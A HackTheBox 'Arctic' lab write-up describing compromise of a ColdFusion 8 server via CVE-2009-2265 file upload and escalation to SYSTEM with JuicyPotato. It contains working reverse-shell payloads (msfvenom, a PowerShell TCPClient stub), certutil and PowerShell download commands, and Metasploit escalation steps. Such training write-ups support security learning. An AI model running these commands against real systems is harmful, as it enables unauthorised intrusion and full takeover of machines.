# HTB Arctic — Full Writeup

## Box Info

| Field | Value |
|---|---|
| Platform | HackTheBox |
| OS | Windows Server 2008 R2 |
| Difficulty | Easy |
| Stack | Adobe ColdFusion 8 / FCKeditor |

## Attack Flow

Nmap scan → Identify ColdFusion 8 on port 8500 → Exploit CVE-2009-2265 (arbitrary file upload via FCKeditor) → Upload JSP reverse shell → RCE as tolis → SeImpersonatePrivilege → JuicyPotato (or Metasploit ms16_075_reflection_juicy) → SYSTEM

## Phase 1: Enumeration

Nmap found three open ports:
- 135/tcp — Microsoft Windows RPC
- 8500/tcp — ColdFusion (fmtp)
- 49154/tcp — unknown

Port 8500 is the key — Adobe ColdFusion 8 running a web interface. The CFIDE directory is accessible, confirming the version and exposing the FCKeditor component.

## Phase 2: Initial Access — CVE-2009-2265

Adobe ColdFusion 8 has a known arbitrary file upload vulnerability in the FCKeditor component. The upload endpoint at `/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm` allows uploading files without authentication.

The exploit uses a null byte bypass (`%00`) in the filename to upload a `.jsp` file that gets executed by the server:
1. Generate a JSP reverse shell payload with msfvenom
2. Upload it through the FCKeditor endpoint
3. Trigger it by requesting the uploaded file at `/userfiles/file/FILENAME.jsp`

### Using the Python Exploit (50057.py)

The public exploit script had a bug — the subprocess functions couldn't access variables defined in `__main__` due to Python multiprocessing scoping. Fix: either pass variables as function arguments or do the listener + trigger manually.

### Manual Approach

Generate payload:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -o shell.jsp
```

Upload via curl or the exploit script, start a listener, then trigger:
```bash
nc -nlvp 4444
curl http://TARGET:8500/userfiles/file/shell.jsp
```

## Phase 3: Privilege Escalation

### Method 1: JuicyPotato

Landed as `arctic\tolis`. Checked privileges with `whoami /priv` and found **SeImpersonatePrivilege** enabled — this is common on service accounts (ColdFusion runs as a service).

JuicyPotato abuses SeImpersonatePrivilege by setting up a fake COM server, tricking a SYSTEM-level COM service into authenticating to it, capturing the SYSTEM token, and using it to spawn a new process as SYSTEM.

Transferred JuicyPotato.exe to the target. Complex reverse shell commands with special characters get mangled when passed through JP's `-a` argument (cmd.exe interprets pipes and dollar signs), so wrote the payload to a `.bat` file first:

```cmd
echo powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',5555);..." > C:\Users\tolis\rev.bat
C:\Users\tolis\JP.exe -l 1337 -t * -p C:\Users\tolis\rev.bat
```

Lesson: when passing complex payloads through multiple layers (JP → cmd → PowerShell), write to a file and execute the file.

### Method 2: Metasploit

Alternatively, used Metasploit for the full chain:

1. Generate meterpreter payload:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4242 -f exe -o shell.exe
```

2. Start handler:
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT 4242
run
```

3. Upload and execute shell.exe on target via certutil
4. Got meterpreter session, ran exploit suggester:
```
run post/multi/recon/local_exploit_suggester
```

5. Found multiple vulnerabilities including `ms16_075_reflection_juicy` (Metasploit's built-in JuicyPotato). Used it:
```
background
use exploit/windows/local/ms16_075_reflection_juicy
set SESSION 2
set LHOST YOUR_IP
run
```

6. Got SYSTEM meterpreter session.

## Methodology Notes

### ColdFusion Enumeration

- Default port is 8500
- Check `/CFIDE/administrator/` for version info and admin panel
- FCKeditor at `/CFIDE/scripts/ajax/FCKeditor/` is a common upload vector
- ColdFusion runs as a service account → likely has SeImpersonatePrivilege

### SeImpersonatePrivilege Escalation

Always check `whoami /priv` after landing a shell on Windows. Service accounts (IIS, ColdFusion, MSSQL, Tomcat) almost always have SeImpersonatePrivilege. Escalation options:
- **JuicyPotato** — Windows Server 2008/2012, Windows 7/8/10 (pre-1809)
- **PrintSpoofer** — Windows 10/Server 2016+
- **GodPotato** — works across most Windows versions
- **Metasploit ms16_075_reflection_juicy** — automated JuicyPotato through meterpreter

### Payload Delivery Tips

- `certutil -urlcache -f http://IP/file.exe C:\path\file.exe` — built-in Windows download
- `powershell iwr http://IP/file.exe -outfile C:\path\file.exe` — PowerShell download
- When commands with special characters break, write them to a `.bat` or `.ps1` file first and execute the file
- Always try `getsystem` in meterpreter before running exploit suggester — sometimes it just works
